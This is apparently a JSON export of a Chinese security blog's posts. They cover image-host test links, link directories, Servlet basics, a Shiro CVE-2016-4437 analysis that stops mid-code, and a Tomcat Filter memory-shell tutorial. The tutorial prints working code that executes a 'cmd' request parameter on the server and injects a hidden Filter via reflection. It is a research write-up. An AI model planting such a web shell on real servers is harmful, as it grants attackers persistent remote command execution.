[{"id":"7b9812fe6cbf2aba598dcdf2de807daf","title":"Test","content":"\n\n\n\n\n\n\n\n\n\n\n测试专用：\n测试即将添加得新功能\n测试Bug写Bug\n\nWell Know\n公益图床Images\n测试图床的可靠性，存储缓存的精美图片\n\n\nOldImages\nhttps://img1.imgtp.com/2022/12/29/uSDeUTRl.jpghttps://img1.imgtp.com/2022/12/29/37ZdW4kd.pnghttps://img1.imgtp.com/2022/12/29/EnfYkbZ1.pnghttps://img1.imgtp.com/2022/12/29/pg6VEHHl.jpghttps://img1.imgtp.com/2022/12/29/Y0qZaXTg.jpghttps://img1.imgtp.com/2022/12/29/gmqIPKRh.jpghttps://img1.imgtp.com/2022/12/29/S4Wm7uJm.jpghttps://img1.imgtp.com/2022/12/29/06Q4a1Mk.jpghttps://img1.imgtp.com/2022/12/29/znrYWOBV.jpghttps://img1.imgtp.com/2022/12/29/sJbuBfwT.jpghttps://img1.imgtp.com/2022/12/29/DjLxDUy1.jpghttps://img1.imgtp.com/2022/12/29/1b6m2t1c.pnghttps://img1.imgtp.com/2022/12/29/oltssDTv.jpghttps://img1.imgtp.com/2022/12/29/IWXwASQo.jpghttps://img1.imgtp.com/2022/12/29/9IWBdBLB.jpghttps://img1.imgtp.com/2022/12/29/GYj3TsCZ.jpghttps://img1.imgtp.com/2022/12/29/ikr5yemq.jpghttps://img1.imgtp.com/2022/12/29/zau1NkxE.jpghttps://img1.imgtp.com/2022/12/29/kc1Kw9ix.jpghttps://img1.imgtp.com/2022/12/29/asEu0uqy.jpghttps://img1.imgtp.com/2022/12/19/D4gTVMUx.jpghttps://img1.imgtp.com/2022/12/29/Q9dqVOtu.pnghttps://img1.imgtp.com/2022/12/29/OLvHtttT.jpghttps://img1.imgtp.com/2022/12/29/DKzm2xtl.jpghttps://img1.imgtp.com/2022/12/29/uWDljUFQ.jpghttps://img1.imgtp.com/2022/12/29/2JqCpzhK.jpghttps://img1.imgtp.com/2022/12/29/lDMOSnFg.jpghttps://img1.imgtp.com/2022/12/29/14Blr0Nz.jpghttps://img1.imgtp.com/2022/12/29/YGORlVUg.jpghttps://img1.imgtp.com/2022/12/29/aiF2n9Ud.jpghttps://img1.imgtp.com/2022/12/29/orUU0jPu.jpghttps://img1.imgtp.com/2022/12/29/2aB29hsU.jpghttps://img1.imgtp.com/2022/12/29/Z5cFUmQU.jpghttps://img1.imgtp.com/2022/12/29/GYIv5Rwi.jpghttps://img1.imgtp.com/2022/12/29/33YsHojN.pnghttps://img1.imgtp.com/2022/12/29/uSDeUTRl.jpghttps://img1.imgtp.com/2022/12/29/37ZdW4kd.pnghttps://img1.imgtp.com/2022/12/29/EnfYkbZ1.pnghttps://img1.imgtp.com/2022/12/29/zXwyOpf9.jpghttps://img1.imgtp.com/2022/12/29/pg6VEHHl.jpghttps://img1.imgtp.com/2022/12/29/ZWyC72fy.jpghttps://img1.imgtp.com/2022/12/29/ZWSbGVmZ.jpghttps://img1.imgtp.com/2022/12/29/Y0qZaXTg.jpghttps://img1.imgtp.com/2022/12/29/k6bxWc1q.jpg\n\n\n\n1080P\nhttps://img1.imgtp.com/2022/11/18/AkrvuUDT.jpghttps://img1.imgtp.com/2022/12/29/bKHEuhiz.jpghttps://img1.imgtp.com/2022/12/29/AMcgxKyF.jpghttps://img1.imgtp.com/2022/12/29/Qc5RzbgW.jpghttps://img1.imgtp.com/2022/12/29/5PNmmFwa.jpghttps://img1.imgtp.com/2022/12/29/QOm1QRhg.jpghttps://img1.imgtp.com/2022/12/29/LBh2Lh9p.jpghttps://img1.imgtp.com/2022/12/29/9nBdn2lE.jpghttps://img1.imgtp.com/2022/12/29/quM6Q6jK.jpghttps://img1.imgtp.com/2022/12/29/woGfpekh.jpghttps://img1.imgtp.com/2022/12/29/y0GalXG8.jpghttps://img1.imgtp.com/2022/12/29/5OPWxALV.jpghttps://img1.imgtp.com/2022/12/29/TTyF9qb2.jpghttps://img1.imgtp.com/2022/12/29/rsQ56TVJ.pnghttps://img1.imgtp.com/2022/12/29/J837DC76.pnghttps://img1.imgtp.com/2022/12/29/ZlTSZZVg.jpghttps://img1.imgtp.com/2022/12/29/DkX1iAcq.jpghttps://img1.imgtp.com/2022/12/29/My5ko1hC.jpghttps://img1.imgtp.com/2022/12/29/gqgz5tTt.jpghttps://img1.imgtp.com/2022/12/29/mWDobZRD.jpghttps://img1.imgtp.com/2022/12/29/pcDQXpB5.jpghttps://img1.imgtp.com/2022/12/29/PaZyMd5Q.jpghttps://img1.imgtp.com/2022/12/29/0Bh2Pykf.jpghttps://img1.imgtp.com/2022/12/29/MP7f0xlb.jpghttps://img1.imgtp.com/2022/12/29/HELempaT.jpghttps://img1.imgtp.com/2022/12/29/TyikGtU8.jpghttps://img1.imgtp.com/2022/12/29/K3K2cE0l.jpghttps://img1.imgtp.com/2022/12/29/EAKJlRfZ.jpghttps://img1.imgtp.com/2022/12/29/bnKqJ23e.jpghttps://img1.imgtp.com/2022/12/29/ZAiGs7PK.jpghttps://img1.imgtp.com/2022/12/29/NlLyVvPA.jpghttps://img1.imgtp.com/2022/12/29/yE2Gckif.jpghttps://img1.imgtp.com/2022/12/29/G61RDJuq.jpghttps://img1.imgtp.com/2022/12/29/y3KqmF3f.jpghttps://img1.imgtp.com/2022/12/29/Xsozgx25.jpghttps://img1.imgtp.com/2022/12/29/ta0LIgzs.jpghttps://img1.imgtp.com/2022/12/29/cnWkuXpy.jpghttps://img1.imgtp.com/2022/12/29/zusp4wXk.jpghttps://img1.imgtp.com/2022/12/29/vmANLZRu.jpghttps://img1.imgtp.com/2022/12/29/g7PJ7Mpl.jpghttps://img1.imgtp.com/2022/12/29/L9ItP6dI.jpghttps://img1.imgtp.com/2022/12/29/yHz4YRWh.jpghttps://img1.imgtp.com/2022/12/29/xrP6SBGT.jpghttps://img1.imgtp.com/2022/12/29/I8wlxv9O.jpghttps://img1.imgtp.com/2022/12/29/tc80TC10.jpghttps://img1.imgtp.com/2022/12/29/olN5TL0t.jpghttps://img1.imgtp.com/2022/12/29/dujJS3MK.pnghttps://img1.imgtp.com/2022/12/29/vsYlZcmL.jpghttps://img1.imgtp.com/2022/12/29/zrzJEGyP.jpghttps://img1.imgtp.com/2022/12/29/wZHh2IsA.jpghttps://img1.imgtp.com/2022/12/29/mMcznwKi.jpghttps://img1.imgtp.com/2022/12/29/TcfdHWui.jpghttps://img1.imgtp.com/2022/12/29/ay2NCpwj.jpghttps://img1.imgtp.com/2022/12/29/aKLE61HP.jpghttps://img1.imgtp.com/2022/12/29/YevKp9Ii.jpghttps://img1.imgtp.com/2022/12/29/gOxsMoNn.jpghttps://img1.imgtp.com/2022/12/29/kc1Kw9ix.jpghttps://img1.imgtp.com/2022/12/29/TZMjRhlT.jpghttps://img1.imgtp.com/2022/12/29/6xGWiRzG.jpghttps://img1.imgtp.com/2022/12/29/etQ5bp23.jpghttps://img1.imgtp.com/2022/12/29/2pDGbB9i.jpghttps://img1.imgtp.com/2022/12/29/o3nZeWSI.jpghttps://img1.imgtp.com/2022/12/29/cPhShYkY.jpghttps://img1.imgtp.com/2022/12/29/DyR6jvOg.jpghttps://img1.imgtp.com/2022/12/29/02zKxLfJ.jpghttps://img1.imgtp.com/2022/12/29/kT175B18.jpghttps://img1.imgtp.com/2022/12/29/vmBwbgd8.jpghttps://img1.imgtp.com/2022/12/29/yAkQ4ppj.jpghttps://img1.imgtp.com/2022/12/29/6X3y10og.jpg\n\n\n\n1080P 压缩后 背景\nhttps://img1.imgtp.com/2023/01/01/uxAkXTML.jpghttps://img1.imgtp.com/2023/01/01/0ZGibDcO.jpghttps://img1.imgtp.com/2023/01/01/10JegxyR.jpghttps://img1.imgtp.com/2023/01/01/o0bWYTOo.jpghttps://img1.imgtp.com/2023/01/01/muYBxUh6.jpghttps://img1.imgtp.com/2023/01/01/T0Mv9oRw.jpghttps://img1.imgtp.com/2023/01/01/XieXfB1H.jpghttps://img1.imgtp.com/2023/01/01/WvVJHFJ5.jpghttps://img1.imgtp.com/2023/01/01/hudUJzJk.jpghttps://img1.imgtp.com/2023/01/01/y5UyRdIl.jpghttps://img1.imgtp.com/2023/01/01/21mJWNqE.jpghttps://img1.imgtp.com/2023/01/01/Viep2KWx.jpghttps://img1.imgtp.com/2023/01/01/RGcb7Gjd.jpghttps://img1.imgtp.com/2023/01/01/KXL9cDX7.jpghttps://img1.imgtp.com/2023/01/01/2pg10gT0.jpghttps://img1.imgtp.com/2023/01/01/WWZlTZQE.jpghttps://img1.imgtp.com/2023/01/01/0i2UUfdS.jpghttps://img1.imgtp.com/2023/01/01/Xy4mkJKk.jpghttps://img1.imgtp.com/2023/01/01/3MIbTpVF.jpghttps://img1.imgtp.com/2023/01/01/OnKEvb7B.jpghttps://img1.imgtp.com/2023/01/01/oF4YSJZ1.jpghttps://img1.imgtp.com/2023/01/01/VaN1SPL5.jpghttps://img1.imgtp.com/2023/01/01/YUWqdkLh.jpghttps://img1.imgtp.com/2023/01/01/Kg64CiHH.jpghttps://img1.imgtp.com/2023/01/01/FAgVlpKR.jpghttps://img1.imgtp.com/2023/01/01/2I796Wbn.jpghttps://img1.imgtp.com/2023/01/01/iWd7DOEr.jpg\n\n\n","slug":"Test","date":"2021-12-22T08:34:16.000Z","categories_index":"TestBlog","tags_index":"Test,多标签","author_index":"Akpigs"},{"id":"c18131c8f0a2bfb1f8168dcc8bb3a259","title":"Tomcat内存马之Filter","content":"Tomcat内存马之Filter前言关于 Filter 的知识，在前面Filter章节已经学习过，这里不再赘述，直接进入分析环节。\nFilter流程分析先编写一个简单的 Filter 实现类\npackage com.servlet.study;\n\nimport javax.servlet.*;\nimport javax.servlet.annotation.WebFilter;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\n\n&#x2F;**\n * Created by dotast on 2022&#x2F;10&#x2F;21 10:41\n *&#x2F;\n@WebFilter(filterName &#x3D; &quot;FilterTest&quot;, urlPatterns &#x3D; &#123;&quot;&#x2F;*&quot;&#125;)\npublic class FilterTest implements Filter &#123;\n\n    public void init(FilterConfig filterConfig) throws ServletException &#123;\n\n    &#125;\n\n    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;\n        String cmd &#x3D; servletRequest.getParameter(&quot;cmd&quot;);\n        try&#123;\n            if(cmd !&#x3D; null)&#123;\n                InputStream inputStream &#x3D; Runtime.getRuntime().exec(cmd).getInputStream();\n                ByteArrayOutputStream bao &#x3D; new ByteArrayOutputStream();\n                byte[] bytes &#x3D; new byte[1024];\n                int a &#x3D; -1;\n                while((a &#x3D; inputStream.read(bytes))!&#x3D;-1)&#123;\n                    bao.write(bytes, 0, a);\n                &#125;\n                servletResponse.getWriter().write(new String(bao.toByteArray()));\n            &#125;\n        &#125;catch (Exception e)&#123;\n            e.printStackTrace();\n        &#125;\n        &#x2F;&#x2F; 使下一个 Filter 能够继续执行\n        filterChain.doFilter(servletRequest,servletResponse);\n    &#125;\n\n    public void destroy() &#123;\n\n    &#125;\n&#125;\n\n访问后带上参数执行命令\n在doFilter()处方法打上断点，看看调用栈\n从StandardWrapperValve#invoke()方法跟起\n首先通过ApplicationFilterFactory.createFilterChain()方法创建了一个ApplicationFilterChain类型对象，跟进createFilterChain()方法\n初始化了ApplicationFilterChain对象，继续往下走\n接下来获取到了StandardContext类对象context，并通过context.findFilterMaps()方法拿到了filterMaps数组，继续往下走\n在 if 条件中，请求路径和filterMap设置的规则进行匹配，如果满足则进入 if 条件中，接着根据filterMap对象中存储的filter名称在StandardContext类的filterConfigs寻找filterConfig，如果不为空则通过addFilter()方法添加到filterChain的属性中\naddFilter()方法源码如上图所示，代码逻辑就是进行了去重、扩容并添加filterConfig。\n最后回到StandardWrapperValve类中往下走\n跟进filterChain.doFilter()方法中\n继续跟进internalDoFilter()方法\n创建了ApplicationFilterConfig类对象filterConfig，然后通过filterConfig.getFilter()方法取出filter，接着调用filter.doFilter()方法，跟进后就是我们编写的恶意类FilterTest\n至此步骤算是走完了，总结一下流程：\n\n通过ApplicationFilterFactory.createFilterChain()方法初始化ApplicationFilterChain对象；\n初始化空的ApplicationFilterChain对象；\n获取StandardContext类对象，并中StandardContext类对象中取出FilterMaps数组,FilterMaps数组中的FilterMap存储名称和匹配规则；\n根据FilterMap的名称在StandardContext类的filterConfigs中查找，如果不为空则添加到filterChain对象的属性中；\n\n\n执行filterChain#doFilter()方法进入编写的恶意实现类FilterTest的doFilter()方法中执行代码。\n\n接下来再看看Filter的初始化加载流程，把断点打在类名处\n看看调用栈\n跟进filterStart()方法\n遍历 Map 对象filterDefs并获取到entry.getValue()，作为参数传入初始化的ApplicationFilterConfig对象filterConfig，然后通过put()方法把filterConfig添加到filterConfigs中。\n至此我们知道和 filter 有关的三个字段分别为：filterMaps、filterDefs和filterConfigs\nFilter内存马的实现我们先总结一下这三个字段存储的内容\nfilterMaps\n\n可以看到在filterMaps中以数组的方式存储着 filter 的名称和路径映射信息，其中dispatcherMapping、filterName和urlPatterns是必须的。\nfilterDefs\n\nfilterDefs以键值对的方式存储filterDef，filterDef为 Map 对象，value 存储着重要的filter、filterClass和filterName。\nfilterConfigs\n\nfilterConfigs存储着当前的上下文StandardContext（WEB 应用），filter对象和filterDef等等信息。\n经过前面的分析，我们可以通过控制上述三个属性的内容达到动态添加恶意 Filter 的目的， 思路如下：\n\n编写恶意的 Filter 实现类；\n获取StandardContext对象；\n利用FilterDef对filter进行封装；\n创建FilterMap，将filterName和urlPatterns进行绑定（因为 Filter 是按照先后顺序进行调用，所以我们最好把恶意 Filter 放到最前面）\n使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中\n\n最后 Filter 内存马实现如下：\n&lt;%@ page import&#x3D;&quot;java.io.IOException&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.io.InputStream&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.io.ByteArrayOutputStream&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.lang.reflect.Field&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;org.apache.catalina.connector.Request&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;org.apache.catalina.core.StandardContext&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.lang.reflect.Constructor&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;org.apache.catalina.Context&quot; %&gt;\n&lt;%@ page import&#x3D;&quot;java.util.Map&quot; %&gt;&lt;%--\n  Created by dotast on 2022&#x2F;10&#x2F;31 16:51\n--%&gt;\n&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;\n&lt;%!\n    class FilterTest implements Filter &#123;\n\n        public void init(FilterConfig filterConfig) throws ServletException &#123;\n\n        &#125;\n\n        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;\n            String cmd &#x3D; servletRequest.getParameter(&quot;cmd&quot;);\n            try&#123;\n                if(cmd !&#x3D; null)&#123;\n                    InputStream inputStream &#x3D; Runtime.getRuntime().exec(cmd).getInputStream();\n                    ByteArrayOutputStream bao &#x3D; new ByteArrayOutputStream();\n                    byte[] bytes &#x3D; new byte[1024];\n                    int a &#x3D; -1;\n                    while((a &#x3D; inputStream.read(bytes))!&#x3D;-1)&#123;\n                        bao.write(bytes, 0, a);\n                    &#125;\n                    servletResponse.getWriter().write(new String(bao.toByteArray()));\n                &#125;\n            &#125;catch (Exception e)&#123;\n                e.printStackTrace();\n            &#125;\n            &#x2F;&#x2F; 使下一个 Filter 能够继续执行\n            filterChain.doFilter(servletRequest,servletResponse);\n        &#125;\n\n        public void destroy() &#123;\n\n        &#125;\n    &#125;\n%&gt;\n\n&lt;%\n    String filterName &#x3D; &quot;FilterTest&quot;;\n    &#x2F;&#x2F; 获取StandardContext对象\n    Field field &#x3D; request.getClass().getDeclaredField(&quot;request&quot;);\n    field.setAccessible(true);\n    Request req &#x3D; (Request) field.get(request);\n    StandardContext standardContext &#x3D; (StandardContext) req.getContext();\n\n    &#x2F;&#x2F; 利用FilterDef对filter进行封装\n    FilterTest filterTest &#x3D; new FilterTest();\n    FilterDef filterDef &#x3D; new FilterDef();\n    filterDef.setFilter(filterTest);\n    filterDef.setFilterName(filterName);\n    filterDef.setFilterClass(filterTest.getClass().getName());\n\n    &#x2F;&#x2F; 创建FilterMap，将filterName和urlPatterns进行绑定\n    FilterMap filterMap &#x3D; new FilterMap();\n    filterMap.setFilterName(filterName);\n    filterMap.addURLPattern(&quot;&#x2F;*&quot;);\n    filterMap.setDispatcher(DispatcherType.REQUEST.name());\n    standardContext.addFilterMapBefore(filterMap);\n\n    &#x2F;&#x2F; 封装filterConfig和filterDef到filterConfigs\n    Field field_filterConfigs &#x3D; standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);\n    field_filterConfigs.setAccessible(true);\n    Map filterConfigs &#x3D; (Map) field_filterConfigs.get(standardContext);\n\n    &#x2F;&#x2F; 利用反射创建FilterConfig，并且将filterDef和standardContext作为参数进行传入进行封装filterDe\n    Constructor constructor &#x3D; ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);\n    constructor.setAccessible(true);\n    ApplicationFilterConfig applicationFilterConfig &#x3D; (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);\n\n    &#x2F;&#x2F; 添加到filterConfigs中\n    filterConfigs.put(filterName,applicationFilterConfig);\n%&gt;\n\n访问上传的内存马文件路径使其执行代码，注册内存马\n接着访问其他路由都可以成功执行命令\n","slug":"Filter内存马","date":"2021-11-09T16:18:15.000Z","categories_index":"Java安全","tags_index":"Java安全","author_index":"Akpigs"},{"id":"fb1b5febdd29c32cc279b65b5a5e127a","title":"简易导航2","content":"值得推荐资源之——实用网站日常生活电影观看\n电影导航 | 快导航网\n可乐影视\n\n有趣网站\nLKs - 良心到难以置信的网站推荐\n居家简易食谱\n健身百科\n猜中国省份\n新经济死亡公司数据库\n折叠纸飞机折叠说明\nWantWords 反向词典\nWindy台风预测\n今日热榜官网\nTradingView – 追踪所有市场\n论文阅读-ReadPaper论文阅读平台\n来自太空的流星雨\n广阔宏大的宇宙\n终端文字生成器\n在线PS\n书法生成器\n英文艺术字生成\n钢琴音乐\n手机全历史\n17万张高分辨率世界名画\n美丽的风景\n世界飞机实时信息\n森林之声\n\n便民\n中国法律服务网\n\n\n历史神话\n中国神话\n全历史\n中华珍宝管\n\n高清壁纸\n极简壁纸_海量电脑桌面壁纸美图_4K超高清_最潮壁纸网站                \n动态壁纸 - 动态桌面 - 视频壁纸 – 第2 页 共306 页 - 致美化 - 漫锋网\n\nPPT模板\nPPT模板_PPT模版免费下载_免费PPT模板下载 -【第一PPT】                        \nPPT模板下载_PPT模板免费下载_幻灯片模板下载 - 优品PPT                        \nHiPPTER | PPT资源导航 | PPT模板图表等设计素材免费下载\n\n图书资源\n微信读书-正版书籍小说免费阅读                \n[搬书匠] - 电子书(EBook)                \nIT 电子书 - 免费下载 - 新版本                \n电子图书馆。免费下载图书。查找图书\n\n翻译\n在线翻译_有道                    \nGoogle Translate      \nDeel翻译器\n\n打字练习\n打字练习_在线-零基础到运指如飞_蓝豆打字|LDou.com                        \n在线打字测试（dazi.kukuw.com）                        \nTyping Practice                                       \nQwerty Learner（备用一）          \nQwerty Learner（备用二）                        \nTyping Practice for Programmers | typing.io                        \nPractice typing by retyping ENTIRE novels — TypeLit.io                        \nLearn Touch Typing Free - TypingClub\n\n邮箱加密邮箱\nTutanota：免费安全的加密邮箱                    \nFree Private &amp; Secure Email Account with Proton Mail | Proton                    \n收件箱 | 0xltlrj9vesyng@proton.me | Proton Mail\n\n临时邮箱i\n莫克特电邮 ||临时一次性电子邮件服务                    \n临时邮箱 | Temp Mail | 24小时邮箱\n\n正常邮件\n163网易免费邮–中文邮箱第一品牌\n登录QQ邮箱\n126网易免费邮–你的专业电子邮\nGoogle Gmail\nYahoo\nOutlook – free personal email and calendar from Microsoft\n\n娱乐游戏\n国外在线小游戏合集\n彩色结益智小游戏\n与AI对战石头剪刀布\n喵星人大战自动售货机】\n在线飞行模拟器\n\n音乐\nQQ音乐\n网易云音乐\nSpotify\nYoutube\n\nWindows好用工具推荐内核工具\nArk工具集\nWindows安全研究工具集\n\n逆向工程师专属\n工具集\n吾爱破解工具包\n\n高效工具\nTypora\nXmind密码:2nsu\nxxx\n\n垃圾清理\nCClearn\nGeek uninstall\nWiseCare365\n\n安全软件\n火绒安全\n360安全卫士\n卡巴斯基\n\n科学上网工具\nClash 密码:eq1n  –  官网地址\nV2rayN   –  官网地址\n\n","slug":"简易导航2","date":"2021-07-23T08:50:14.000Z","categories_index":"导航","tags_index":"导航,资源,工具","author_index":"Akpigs"},{"id":"a7ae0256c9c3ac9cd41df0d3fab9f886","title":"简易导航之前端必备","content":"\nClick to see more\n\n\n\nCSS颜色搭配\n\n\n\nhttps://mycolor.space/\n\n\nhttps://webgradients.com/\n\n\nhttps://gradientbuttons.colorion.co/\n\n\nhttps://www.eggradients.com/category/green-gradient\n\n\nhttps://uigradients.com/#SiriusTamed\n\n\nhttps://coolbackgrounds.io/\n\n\nhttps://products.ls.graphics/mesh-gradients/\n\n\n\n\n\n","slug":"简易导航之前端必备","date":"2022-04-17T12:06:45.000Z","categories_index":"前端","tags_index":"导航,前端","author_index":"Akpigs"},{"id":"8badacccd885f5f014e6790202a79164","title":"Servlet基础","content":"Servlet基础概念\n\n\n\n\n\n\n\n\nJava Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。\n使用 Servlet，您可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。\n狭义的Servlet是指Java语言实现的一个接口，广义的Servlet是指任何实现了这个Servlet接口的类，一般情况下，人们将Servlet理解为后者。\nJava EE 提供了 Servlet API，通过 Servlet，我们可以处理 Web 应用程序的 HTTP 请求以及响应，关系如下：\n\n\nServlet的定义定义 Servlet 只需要编写的类继承javax.servlet.http.HttpServlet类并重写doGet()或者doPost()等代表请求方式的方法即可。\nHttpServlet先了解一下HttpServlet类，从图中可以看到该类继承于GenericServlet类\n\n\n而GenericServlet类实现了Servlet、ServletConfig和Serializable接口\nHttpServlet抽象类中含有doGet/doPost/doDelete/doHead/doPut/doOptions/doTrace等方法用于处理客户端的不同请求方法，因此我们在定义 Servlet 时，要重写该抽象类中的方法用于处理请求。\n基于注解方式配置在 Servlet 3.0 之后可以采用注解方式配置 Servlet，在任意类导入javax.servlet.annotation.WebServlet;\n在 pom.xml 文件中添加 maven 依赖：\n&lt;dependency&gt;\n    &lt;groupId&gt;javax.servlet&lt;&#x2F;groupId&gt;\n    &lt;artifactId&gt;javax.servlet-api&lt;&#x2F;artifactId&gt;\n    &lt;version&gt;3.1.0&lt;&#x2F;version&gt;\n&lt;&#x2F;dependency&gt;\n\n编写 ServletTest.class\npackage com.servlet.study;\n\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\nimport java.io.PrintWriter;\n\n&#x2F;**\n * Created by dotast on 2022&#x2F;10&#x2F;21 10:41\n *&#x2F;\n@WebServlet(urlPatterns &#x3D; &quot;&#x2F;hello&quot;)\npublic class ServletTest extends HttpServlet &#123;\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException &#123;\n        PrintWriter out &#x3D; resp.getWriter();\n        out.write(&quot;&lt;h1&gt;Hello, dotast!&lt;&#x2F;h1&gt;&quot;);\n        out.flush();\n        out.close();\n    &#125;\n&#125;\n\n访问/hello接口\n\n\n基于web.xml文件配置编写好 ServletTest 类\npackage com.servlet.study;\n\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\nimport java.io.PrintWriter;\n\n&#x2F;**\n * Created by dotast on 2022&#x2F;10&#x2F;21 10:41\n *&#x2F;\n\npublic class ServletTest extends HttpServlet &#123;\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException &#123;\n        PrintWriter out &#x3D; resp.getWriter();\n        out.write(&quot;&lt;h1&gt;Hello, dotast!&lt;&#x2F;h1&gt;&quot;);\n        out.flush();\n        out.close();\n    &#125;\n&#125;\n\n在 web.xml 文件中配置 servlet 标签\n\n\n启动后访问定义好的url-pattern\n\n\nRequest与Response在前面我们编写的 Servlet 类中，doGet()方法传入了HttpServletRequest对象和HttpServletResponse对象\npublic class ServletTest extends HttpServlet &#123;\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException &#123;\n        PrintWriter out &#x3D; resp.getWriter();\n        out.write(&quot;&lt;h1&gt;Hello, dotast!&lt;&#x2F;h1&gt;&quot;);\n        out.flush();\n        out.close();\n    &#125;\n\nHttpServletRequest对象用于处理来自客户端的请求，当客户端通过HTTP协议访问服务器时，HTTP 中的所有信息都封装在这个对象中，通过HttpServletRequest对象可以获取到客户端请求的所有信息。\nHttpServletResponse对象用于响应客户端的请求，通过HttpServletResponse对象可以处理服务器端对客户端请求响应。\nHttpServletRequest常用方法\n\n\n方法\n说明\n\n\n\ngetParameter(String name)\n获取请求中的参数，该参数是由name指定的\n\n\ngetParameterValues(String name)\n返回请求中的参数值，该参数值是由name指定的\n\n\ngetRealPath(String path)\n获取Web资源目录\n\n\ngetAttribute(String name)\n返回name指定的属性值\n\n\ngetAttributeNames()\n返回当前请求的所有属性的名字集合\n\n\ngetCookies()\n返回客户端发送的Cookie\n\n\ngetSession()\n获取session回话对象\n\n\ngetInputStream()\n获取请求主题的输入流\n\n\ngetReader()\n获取请求主体的数据流\n\n\ngetMethod()\n获取发送请求的方式，如GET、POST\n\n\ngetParameterNames()\n获取请求中所有参数的名称\n\n\ngetRemoteAddr()\n获取客户端的IP地址\n\n\ngetRemoteHost()\n获取客户端名称\n\n\ngetServerPath()\n获取请求的文件的路径\n\n\nHttpServletResponse常用方法\n\n\n方法\n说明\n\n\n\ngetWriter()\n获取响应打印流对象\n\n\ngetOutputStream()\n获取响应流对象\n\n\naddCookie(Cookie cookie)\n将指定的Cookie加入到当前的响应中\n\n\naddHeader(String name,String value)\n将指定的名字和值加入到响应的头信息中\n\n\nsendError(int sc)\n使用指定状态码发送一个错误到客户端\n\n\nsendRedirect(String location)\n发送一个临时的响应到客户端\n\n\nsetDateHeader(String name,long date)\n将给出的名字和日期设置响应的头部\n\n\nsetHeader(String name,String value)\n将给出的名字和值设置响应的头部\n\n\nsetStatus(int sc)\n给当前响应设置状态码\n\n\nsetContentType(String ContentType)\n设置响应的MIME类型\n\n\n","slug":"Servlet基础","date":"2021-11-21T12:49:47.000Z","categories_index":"Java基础","tags_index":"Java基础","author_index":"Akpigs"},{"id":"83f5599915e77d106d96bdbba8cc47db","title":"CVE-2016-4437漏洞分析","content":"CVE-2016-4437漏洞分析前言CVE-2016-4437 是 Shiro 历史漏洞中比较著名的一个，官方编号为 Shiro-550。\n影响版本：Shiro  &lt; 1.2.5\n漏洞描述：如果程序未能正确配置 “remember me” 功能所使用的密钥。攻击者可通过发送带有特制参数的请求利用该漏洞执行任意代码或访问受限制内容。\n前置知识Shiro 在 0.9 版本开始提供 RememberMe 模块，用于应用程序记录登录用户凭证的功能。\nRememberMeManagerorg.apache.shiro.mgt.RememberMeManager接口提供了以下五个方法：\n\ngetRememberedPrincipals()：RememberMe 的功能，在指定上下文中寻找记录的principals。\nforgetIdentity()：忘记用户身份标识。\nonSuccessfulLogin()：登录校验成功时调用，保存当前用户的principals以供应用程序以后调用。\nonFailedLogin()：登录校验失败时调用，忘记当前用户的principals。\nonLogout()：用户退出登录时调用，忘记当前用户的principals。\n\nAbstractRememberMeManagerorg.apache.shiro.mgt.AbstractRememberMeManager是实现RememberMeManger接口类的抽象类，这里有几个比较重要的成员变量需要了解：\n\n DEFAULT_CIPHER_KEY_BYTES：一个硬编码 AES KEY，该 KEY 会被设置为加解密 KEY 的成员变量（encryptionCipherKey&#x2F;decryptionCipherKey）。\nserializer：Shiro 的序列化器，用来对序列化和反序列化标识用户身份的PrincipalCollection对象。\ncipherService：用于数据加解密的类，实际上是org.apache.shiro.crypto.AesCipherService类。\n\nCookieRememberMeManagerorg.apache.shiro.web.mgt.CookieRememberMeManager类在 Shiro 中实现使用 Cookie 记录用户身份信息的功能，比较值得关注的方法为getRememberedSerializedIdentity()：\nprotected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;\n        if (!WebUtils.isHttp(subjectContext)) &#123;\n            if (log.isDebugEnabled()) &#123;\n                String msg &#x3D; &quot;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a servlet request and response in order to retrieve the rememberMe cookie. Returning immediately and ignoring rememberMe operation.&quot;;\n                log.debug(msg);\n            &#125;\n\n            return null;\n        &#125; else &#123;\n            WebSubjectContext wsc &#x3D; (WebSubjectContext)subjectContext;\n            if (this.isIdentityRemoved(wsc)) &#123;\n                return null;\n            &#125; else &#123;\n                HttpServletRequest request &#x3D; WebUtils.getHttpRequest(wsc);\n                HttpServletResponse response &#x3D; WebUtils.getHttpResponse(wsc);\n                String base64 &#x3D; this.getCookie().readValue(request, response);\n                if (&quot;deleteMe&quot;.equals(base64)) 